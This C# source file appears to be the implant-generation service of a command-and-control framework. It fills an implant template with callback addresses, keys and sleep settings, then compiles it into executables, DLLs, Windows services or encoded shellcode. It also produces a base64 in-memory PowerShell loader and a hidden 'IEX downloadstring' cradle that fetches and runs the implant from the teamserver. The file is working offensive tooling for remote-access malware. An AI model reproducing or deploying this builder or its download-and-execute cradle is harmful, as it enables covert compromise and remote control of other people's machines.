using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using ApiModels.Requests;
using TeamServer.Models;
using TeamServer.Models.Extras;
using TeamServer.Models.Managers;
using TeamServer.Utilities;

namespace TeamServer.Services
{
	public interface IEngineerService
	{
		void AddEngineer(Engineer Engineer);
		IEnumerable<Engineer> GetEngineers();
		Engineer GetEngineer(string id);
		void RemoveEngineer(Engineer Engineer);
	}

	public class EngineerService : IEngineerService
	{
		public static readonly List<Engineer> _engineers = new(); //readonly works here because a list is ref type, works even if the data type i nthe list if value type like a list of ints.
															// so I also cant make a new list and try and assin it to this one I can only mess with this list instance not replace it.

		public void AddEngineer(Engineer Engineer)
		{
			_engineers.Add(Engineer);
		}
		public IEnumerable<Engineer> GetEngineers()
		{
			return _engineers;
		}
		public Engineer GetEngineer(string id)
		{
			return GetEngineers().FirstOrDefault(a => a.engineerMetadata.Id.Equals(id));
		}
		public void RemoveEngineer(Engineer Engineer)
		{
			_engineers.Remove(Engineer);
		}

		public static bool CreateEngineers(SpawnEngineerRequest request)
		{
			{
                char allPlatformPathSeperator = Path.DirectorySeparatorChar;
                // find the Engineer cs file and load it to a string so we can update it and then run the compiler function on it
                string path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                //split path at bin keyword
                string[] pathSplit = path.Split("bin"); //[0] is the parent folder [1] is the bin folder
                                                        //update each string in the array to replace \\ with the correct path seperator
                pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
                pathSplit[1] = pathSplit[1].Replace("\\", allPlatformPathSeperator.ToString());

                string filePath = pathSplit[0] + $"..{allPlatformPathSeperator}Engineer" + $"{allPlatformPathSeperator}Program.cs";
                string file = System.IO.File.ReadAllText(filePath);

                //usinf request.managerName to find the correct manager object and then get its BindAddress and BindPort from the manager object
                //then using the BindAddress and BindPort to update the file
                string managerName = request.managerName;
                int connectionAttempts = request.ConnectionAttempts;
                int sleep = request.Sleep;
                SpawnEngineerRequest.SleepTypes sleepType = request.SleepType;
                string managerBindAddress = "";
                string managerBindPort = "";
                string managerConnectionAddress = "";
                string managerConnectionPort = "";
                string managerType = "";


                foreach (manager m in managerService._managers)
                {
                    if (m.Type == manager.ManagerType.http || m.Type == manager.ManagerType.https)
                    {
                        Httpmanager manager = (Httpmanager)m;
                        if (manager.Name == managerName)
                        {
                            managerType = manager.Type.ToString();
                            managerConnectionAddress = manager.ConnectionAddress;
                            managerConnectionPort = manager.ConnectionPort.ToString();
                            file = file.Replace("{{REPLACE_MANAGER_NAME}}", managerName);
                            file = file.Replace("{{REPLACE_MANAGER_TYPE}}", managerType);
                            if (manager.Type == Models.manager.ManagerType.http)
                            {
                                file = file.Replace("{{REPLACE_ISSECURE_STATUS}}", "False");
                            }
                            else if (manager.Type == Models.manager.ManagerType.https)
                            {
                                file = file.Replace("{{REPLACE_ISSECURE_STATUS}}", "True");
                            }
                            //update some C2 Profile stuff 
                            file = file.Replace("{{REPLACE_URLS}}", manager.c2Profile.Urls);
                            file = file.Replace("{{REPLACE_COOKIES}}", manager.c2Profile.Cookies);
                            file = file.Replace("{{REPLACE_REQUEST_HEADERS}}", manager.c2Profile.RequestHeaders);
                            file = file.Replace("{{REPLACE_USERAGENT}}", manager.c2Profile.UserAgent);
                            //update file with ConnectionIP and ConnectionPort from request
                            file = file.Replace("{{REPLACE_CONNECTION_IP}}", managerConnectionAddress);
                            file = file.Replace("{{REPLACE_CONNECTION_PORT}}", managerConnectionPort);
                        }
                    }
                    else if (m.Type == manager.ManagerType.tcp)
                    {
                        if (m.Name == managerName)
                        {
                            TCPManager manager = (TCPManager)m;
                            //update file to update the BindPort, ListenPort, IsLocalHost Properties 
                            file = file.Replace("{{REPLACE_MANAGER_NAME}}", managerName);
                            file = file.Replace("{{REPLACE_MANAGER_TYPE}}", manager.Type.ToString());
                            file = file.Replace("{{REPLACE_BIND_PORT}}", manager.BindPort.ToString());
                            file = file.Replace("{{REPLACE_LISTEN_PORT}}", manager.ListenPort.ToString());
                            file = file.Replace("{{REPLACE_ISLOCALHOSTONLY}}", manager.IsLocalHost.ToString());
                            //update file with ConnectionIP and ConnectionPort from request
                            file = file.Replace("{{REPLACE_CONNECTION_IP}}", managerBindAddress);
                            file = file.Replace("{{REPLACE_CONNECTION_PORT}}", managerBindPort);
                            if (manager.connectionMode == TCPManager.ConnectionMode.bind)
                            {
                                file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "true");
                            }
                            else if (manager.connectionMode == TCPManager.ConnectionMode.reverse)
                            {
                                file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "false");
                                managerBindAddress = manager.ConnectionAddress;
                            }
                        }
                    }
                    else if (m.Type == manager.ManagerType.smb)
                    {


                        if (m.Name == managerName)
                        {
                            SMBmanager manager = (SMBmanager)m;
                            //update file to update the BindPort, ListenPort, IsLocalHost Properties 
                            file = file.Replace("{{REPLACE_MANAGER_NAME}}", managerName);
                            file = file.Replace("{{REPLACE_MANAGER_TYPE}}", manager.Type.ToString());
                            file = file.Replace("{{REPLACE_NAMED_PIPE}}", manager.NamedPipe);
                            file = file.Replace("{{REPLACE_CONNECTION_IP}}", managerBindAddress);
                            file = file.Replace("{{REPLACE_CONNECTION_PORT}}", managerBindAddress);
                            if (manager.connectionMode == SMBmanager.ConnectionMode.bind)
                            {
                                file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "true");
                            }
                            else if (manager.connectionMode == SMBmanager.ConnectionMode.reverse)
                            {
                                file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "false");
                                managerBindAddress = manager.ConnectionAddress;
                            }
                        }
                    }
                }
                //update file with connection attempts 
                file = file.Replace("{{REPLACE_CONNECTION_ATTEMPTS}}", connectionAttempts.ToString());
                //update file with sleep time
                file = file.Replace("{{REPLACE_SLEEP_TIME}}", sleep.ToString());
                file = file.Replace("{{REPLACE_SLEEP_TYPE}}", sleepType.ToString());

                if (request.WorkingHours != null)
                {
                    file = file.Replace("{{REPLACE_WORK_HOURS_START}}", request.WorkingHours.Split('-')[0]);
                    file = file.Replace("{{REPLACE_WORK_HOURS_END}}", request.WorkingHours.Split('-')[1]);
                }
                if (request.WorkingHours != null)
                {
                    Console.WriteLine($"working hours is {request.WorkingHours.Split('-')[0]} and {request.WorkingHours.Split('-')[1]}");
                }

                //update the two univerisal strings as well 
                file = file.Replace("{{REPLACE_MESSAGE_PATH_KEY}}", Encryption.UniversialMessagePathKey); // used on C2 messages 
                file = file.Replace("{{REPLACE_METADATA_KEY}}", Encryption.UniversialMetadataKey); // used on the metadata id header which is used to verify the implant is talking to the correct teamserver

                file = file.Replace("{{REPLACE_UNIQUE_TASK_KEY}}", Encryption.UniversalTaskEncryptionKey);

                file = file.Replace("{{REPLACE_KILL_DATE}}", request.KillDateTime.ToString());

                if (request.implantType == SpawnEngineerRequest.ImplantType.Engineer)
                {
                    Console.WriteLine("Implant is an engineer");
                    file = file.Replace("{{REPLACE_IMPLANT_TYPE}}", Encryption.EncryptImplantName("Engineer"));
                }
                else if (request.implantType == SpawnEngineerRequest.ImplantType.Constructor)
                {
                    Console.WriteLine("Implant is a constructor");
                    file = file.Replace("{{REPLACE_IMPLANT_TYPE}}", Encryption.EncryptImplantName("Constructor"));
                }

                //generate code for the implant
                byte[] assemblyBytes = Utilities.Compile.GenerateCode(file, request.complieType, request.SleepType);
                if (assemblyBytes is null)
                {
                    return false;
                }

                try
                {
                    //use ilMerge to merge the assembly and the protobuf dlls
                    GC.Collect();
                    GC.WaitForPendingFinalizers();

                    //if pathSplit[0]+temp does not exist then create it
                    if (!Directory.Exists(pathSplit[0] + "temp"))
                    {
                        Directory.CreateDirectory(pathSplit[0] + "temp");
                    }



                    string outputLocation = "";
                    string sourceAssemblyLocation = "";
                    if (request.complieType == SpawnEngineerRequest.EngCompileType.exe)
                    {
                        outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
                    }
                    else if (request.complieType == SpawnEngineerRequest.EngCompileType.dll)
                    {
                        outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll";
                        sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.dll";
                        System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
                    }
                    else if (request.complieType == SpawnEngineerRequest.EngCompileType.serviceexe)
                    {
                        outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_service.exe";
                        sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}_service.exe";
                        System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
                    }
                    else
                    {
                        outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
                    }


                    var jsonFastLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}fastJSON.dll";
                    var searchDir = $"{pathSplit[0]}Data{allPlatformPathSeperator}";

                    string[] assemblyArray = { sourceAssemblyLocation, jsonFastLocation };
                    Utilities.MergeAssembly.MergeAssemblies(outputLocation, assemblyArray, searchDir);


                    Console.WriteLine("Merged Engineer and needed dlls");
                    var updatedExe = System.IO.File.ReadAllBytes(outputLocation);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine(ex.StackTrace);
                    return false;
                }

                if (request.complieType == SpawnEngineerRequest.EngCompileType.exe)
                {
                    try
                    {
                        //if enviornment is windows then run confuse 
                        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                        {
                            //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
                        }
                        string compiledEngLocation = $"{pathSplit[0]}..{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer compiled saved at {compiledEngLocation}", Status = "success" });
                        LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
                        Thread.Sleep(10);
                        return true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine(ex.StackTrace);
                        return false;
                    }
                }
                else if (request.complieType == SpawnEngineerRequest.EngCompileType.serviceexe)
                {
                    try
                    {
                        //if enviornment is windows then run confuse 
                        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                        {
                            //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
                        }
                        string compiledEngLocation = $"{pathSplit[0]}..{allPlatformPathSeperator}Engineer_{managerName}_Service.exe";
                        HardHatHub.AlertEventHistory(new HistoryEvent { Event = $" Service engineer compiled saved at {compiledEngLocation}", Status = "success" });
                        LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
                        Thread.Sleep(10);
                        return true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine(ex.StackTrace);
                        return false;
                    }
                }
                else if (request.complieType == SpawnEngineerRequest.EngCompileType.dll)
                {
                    try
                    {
                        //if enviornment is windows then run confuse 
                        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                        {
                            //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
                        }
                        string compiledEngLocation = $"{pathSplit[0]}..{allPlatformPathSeperator}Engineer_{managerName}.dll";
                        HardHatHub.AlertEventHistory(new HistoryEvent { Event = $" Service engineer compiled saved at {compiledEngLocation}", Status = "success" });
                        LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
                        Thread.Sleep(10);
                        return true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine(ex.StackTrace);
                        return false;
                    }
                }
                else if (request.complieType == SpawnEngineerRequest.EngCompileType.shellcode)
                {
                    try
                    {
                        //call the shellcode utility giving it the path we just wrote this exe to then return the shellcode and write its content to a file 
                        var shellcodeLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        var shellcode = Utilities.Shellcode.AssemToShellcode(shellcodeLocation, "");
                        if (request.EncodeShellcode)
                        {
                            var encoded_shellcode = Shellcode.EncodeShellcode(shellcode);
                            System.IO.File.WriteAllBytes(
                                pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin",
                                encoded_shellcode);
                        }
                        else
                        {
                            System.IO.File.WriteAllBytes(
                                pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin",
                                shellcode);
                        }

                        //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
                        string shellLocation = $"{pathSplit[0]}..{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin";
                        HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer shellcode written to {shellLocation}", Status = "success" });
                        LoggingService.EventLogger.Information("Engineer shellcode written to {shellLocation}", shellLocation);

                        return true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine(ex.StackTrace);
                        return false;
                    }
                }
                //if request.compileType is powershellcmd then convert the assemnbly bytes to a base64 string 
                else if (request.complieType == SpawnEngineerRequest.EngCompileType.powershellcmd)
                {
                    try
                    {
                        byte[] Mergedengineer = System.IO.File.ReadAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
                        string binaryb64 = Convert.ToBase64String(Mergedengineer);
                        string powershellCommand = $"$a=[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"{binaryb64}\"));$a.EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null";
                        //write the powershell command to a text file 
                        System.IO.File.WriteAllText(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", powershellCommand);
                        System.IO.File.WriteAllText(pathSplit[0] + "wwwroot" + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", powershellCommand);
                        string psCommandPath = pathSplit[0] + "wwwroot" + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt";

                        HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer powershell command written to {allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", Status = "success" });
                        LoggingService.EventLogger.Information("Engineer powershell command written to {psCommandPath}", psCommandPath);
                        HardHatHub.AddPsCommand($"powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('https://TeamserverIp:HttpManagerPort/Engineer_{managerName}_pscmd.txt'))\"");
                        return true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine(ex.StackTrace);
                        return false;
                    }
                }
                return false;

            }
		}
		
	}
}
